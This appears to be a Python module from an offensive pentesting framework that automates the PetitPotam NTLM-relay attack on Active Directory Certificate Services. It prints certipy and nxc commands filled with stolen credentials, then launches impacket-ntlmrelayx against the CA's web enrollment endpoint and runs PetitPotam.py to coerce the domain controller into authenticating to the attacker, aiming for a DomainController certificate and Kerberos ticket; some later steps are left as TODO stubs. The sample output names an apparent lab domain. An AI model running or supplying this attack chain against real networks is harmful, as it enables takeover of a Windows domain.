PROVIDES = ["exec"]
REQUIRES = ["creds"]

def run(data, cred, args):

    import os
    import subprocess
    import time

    from pathlib import Path
    from datetime import datetime

    from core.attacker import resolve_lhost
    from core.paths import (
        get_artifacts_dir,
        get_tools_dir,
    )

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    W_BOLD = '\033[1m'
    DIM = '\033[2m'

    windows = getattr(args, "windows", False)

    if windows:

        print(
            f"\n{B}┌── WINDOWS REFERENCE ─────────────────────────────┐{W}"
        )

        ip = data.get("ip")
        domain = data.get("domain")
        hostname = data.get("hostname")
        user = cred.get("user")
        password = cred.get("secret")

        print(f"\n{W}# 1. Enumerate AD CS{W}")
        print(
            f"{Y}certipy find "
            f"-u {user} "
            f"-p '{password}' "
            f"-dc-ip {ip} "
            f"-stdout{W}"
        )
        print()

        print(f"{W}# Example output:{W}")
        print(f"{DIM}CA Name : INLANEFREIGHT-CA{W}")
        print(f"{DIM}DNS Name: ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL{W}")
        print()

        print(f"{W}# Resolve the CA hostname to an IP (if needed){W}")
        print(f"{Y}nxc smb {ip.rsplit('.',1)[0]}.0/24 -u {user} -p '{password}'{W}")
        print()

        print(f"{W}# Start NTLM relay against the CA{W}")
        print(
            f"{Y}impacket-ntlmrelayx "
            f"--adcs "
            f"--template DomainController "
            f"-t http://<CA-IP>/certsrv/certfnsh.asp "
            f"-smb2support{W}"
        )
        print()

        print(f"{W}# Trigger PetitPotam{W}")
        print(
            f"{Y}python3 PetitPotam.py "
            f"<ATTACKER-IP> "
            f"{ip}{W}"
        )
        print()

        print(f"{W}# Request a TGT from the relayed certificate{W}")
        print(
            f"{Y}gettgtpkinit.py "
            f"-dc-ip {ip} "
            f"-cert-pfx dc_cert.pfx "
            f"{domain}/{hostname}$ "
            f"dc.ccache{W}"
        )
        print()

        print(f"{W}# Use the Kerberos cache{W}")
        print(f"{Y}export KRB5CCNAME=dc.ccache{W}")
        print()

        print(
            f"{B}└──────────────────────────────────────────────────┘{W}\n"
        )
        return


    ip = data["ip"]
    domain = data["domain"]
    hostname = data["hostname"]
    target = data["name"]

    lhost = resolve_lhost(args)

    artifacts = get_artifacts_dir(target)

    print(
        f"\n{B}┌── PETITPOTAM ───────────────────────┐{W}"
    )

    print(
        f"  {B}[1]{W} Check AD CS"
    )

    print(
        f"  {B}[2]{W} Full Attack\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    #
    # CHECK
    #

    if choice == "1":

        print()

        print(
            f"{Y}certipy find "
            f"-u {cred['user']} "
            f"-p '{cred['secret']}' "
            f"-dc-ip {ip} "
            f"-stdout{W}"
        )

        print()

        return

    #
    # FULL ATTACK
    #

    ca = input(
        f"{Y}CA Host> {W}"
    ).strip()

    if not ca:

        print(
            f"{R}[!] Missing CA hostname{W}"
        )

        return

    template = input(
        f"{Y}Template [{C}DomainController{Y}]> {W}"
    ).strip()

    if not template:

        template = "DomainController"

    relay_log = (
        artifacts /
        "ntlmrelayx.log"
    )

    cert_file = (
        artifacts /
        "dc_cert.pfx"
    )

    ccache = (
        artifacts /
        "dc.ccache"
    )

    relay = [
        "impacket-ntlmrelayx",
        "--adcs",
        "--template",
        template,
        "-t",
        f"http://{ca}/certsrv/certfnsh.asp",
        "-smb2support"
    ]

    print(
        f"\n{B}[*]{W} Starting ntlmrelayx..."
    )
    print(f"{Y}{' '.join(map(str, relay))}{W}\n")
    relay_proc = subprocess.Popen(
        relay,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    time.sleep(2)

    exploit = (
        get_tools_dir() /
        "PetitPotam" /
        "PetitPotam.py"
    )

    trigger = [
        "python3",
        str(exploit),
        lhost,
        ip,
    ]

    print(
        f"{B}[*]{W} Triggering PetitPotam..."
    )
    print(f"{Y}{' '.join(map(str, trigger))}{W}\n")

    subprocess.run(trigger)

    print()

    input(
        f"{Y}[?]{W} Press ENTER once ntlmrelayx has issued the certificate..."
    )

    #
    # TODO:
    #
    # Parse ntlmrelayx output.
    # Extract Base64/PFX certificate.
    # Save to cert_file.
    #

    print(
        f"{B}[*]{W} Requesting TGT..."
    )

    gettgt = [
        "gettgtpkinit.py",
        "-cert-pfx",
        str(cert_file),
        f"{domain}/{hostname}$",
        str(ccache)
    ]

    print(" ".join(gettgt))

    #
    # TODO:
    #
    # subprocess.run(gettgt)
    #
    # Import ccache into credential store.
    #

    print()

    print(
        f"{G}[+] Workflow complete{W}"
    )

    print(
        f"  ├── {cert_file}"
    )

    print(
        f"  └── {ccache}"
    )
